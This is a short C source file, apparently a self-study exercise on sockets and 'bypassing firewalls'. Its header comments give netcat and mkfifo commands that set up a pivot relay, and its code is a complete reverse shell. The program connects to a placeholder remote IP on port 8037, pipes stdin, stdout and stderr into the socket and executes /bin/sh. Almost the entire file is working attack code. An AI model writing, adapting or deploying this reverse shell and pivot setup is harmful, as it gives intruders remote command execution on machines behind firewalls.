//
//    Objectives:
//
// 1) Using sockets
// 2) Bypassing firewalls
//
// written by Sergio Rivera
//
// rshell code based on an example from:
// ISBN	1788475593
//
//
// ********************************************************************
//
// pivot: internet remote (pivoting) server
// local: local machine
// rshell: remote machine where sh is piped to a socket
//
// at pivot machine we create a bidirectional pipe (FIFOs): 
// mkfifo fifo0 fifo1
// nc -vvlp8037 > fifo0 < fifo1 & nc -vvlp8080 < fifo0 > fifo1
//
// at localhost:
// nc -vv pivot 8080
//
// at shell machine:
// gcc -Wnonnull rshell2_v0.c -o rshell2 ; ./rshell2
//
// ----------                    ---------                    ----------
// - local  - <--- Internet ---> - pivot - <--- Internet ---> - rshell -
// ----------                    ---------                    ----------
//
// ********************************************************************
//
//
// rshell code:
//
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
 
const char * REMOTE_IP = "X.X.X.X";

int main(int argc, char *argv[]) 
{
    int socketC;  
    struct sockaddr_in remoteAddr;
    
    // AF_INET -> Internet Protocol v4 addresses
    socketC = socket(AF_INET, SOCK_STREAM, 0);
    if (socketC < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
 
    remoteAddr.sin_family = AF_INET;
    remoteAddr.sin_port = htons(8037);
    remoteAddr.sin_addr.s_addr = inet_addr(REMOTE_IP);
    memset(&(remoteAddr.sin_zero),'\0',8);
    connect(socketC, (struct sockaddr *)&remoteAddr, sizeof(struct sockaddr));
 
    dup2(socketC,0); // stdin
    dup2(socketC,1); // stdout
    dup2(socketC,2); // stderr

//     int execve(const char *filename, char *const argv[],
//                  char *const envp[]); 
    execve("/bin/sh", NULL, NULL);

    exit(EXIT_SUCCESS);

}
